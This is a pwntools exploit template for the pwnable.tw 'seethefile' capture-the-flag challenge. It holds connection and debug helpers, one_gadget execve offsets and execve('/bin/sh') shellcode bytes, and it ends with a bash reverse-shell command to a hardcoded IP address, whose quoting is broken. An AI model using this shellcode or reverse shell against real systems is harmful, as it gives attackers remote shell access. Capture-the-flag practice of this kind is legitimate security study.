from pwn import *
import time

ru = lambda x : io.recvuntil(x)
sn = lambda x : io.send(x)
rl = lambda   : io.recvline()
sl = lambda x : io.sendline(x)
rv = lambda x : io.recv(numb = x)
sa = lambda a,b : io.sendafter(a,b)
sla = lambda a,b : io.sendlineafter(a,b)


context(arch = 'i386', os = 'linux', endian = 'little')
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

filename = "seethefile"
ip = "chall.pwnable.tw"
port = 10104

# LOCAL = False
LOCAL = 1 if len(sys.argv)==1 else 0


break_points = []

b_str = ''
for break_point in break_points:
        b_str += "b *" + hex(break_point ) + '\n'

elf = ELF("./"+filename)
# libc = ELF('libc.so.6') if os.path.exists('libc.so.6') else elf.libc

if LOCAL:
    io = process("./" + filename)
    libc = elf.libc
else:
    io = remote(ip, port)
    libc = ELF('./libc.so.6')

def wait(t=0.3):
    sleep(t)

def mydebug():
  if not LOCAL:
    return
  gdb.attach(io, b_str)

def pause(s = 'pause'):
  if not LOCAL:
    return
  print('pid: ' + str(io.pid))
  raw_input(s)

def interactive():
  io.interactive()

std_in_off = libc.symbols['_IO_2_1_stdin_']


ones_local_x64 = '''
0x45216 execve("/bin/sh", rsp+0x30, environ)
constraints:
  rax == NULL

0x4526a execve("/bin/sh", rsp+0x30, environ)
constraints:
  [rsp+0x30] == NULL

0xf02a4 execve("/bin/sh", rsp+0x50, environ)
constraints:
  [rsp+0x50] == NULL

0xf1147 execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
'''

sc32 = "\x6a\x0b\x58\x53\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xcd\x80"
sc64 = "\xf7\xe6\x50\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x48\x89\xe7\xb0\x3b\x0f\x05"

t = '''bash -c 'bash -i >& /dev/tcp/47.94.239.235/9981 0>&1''''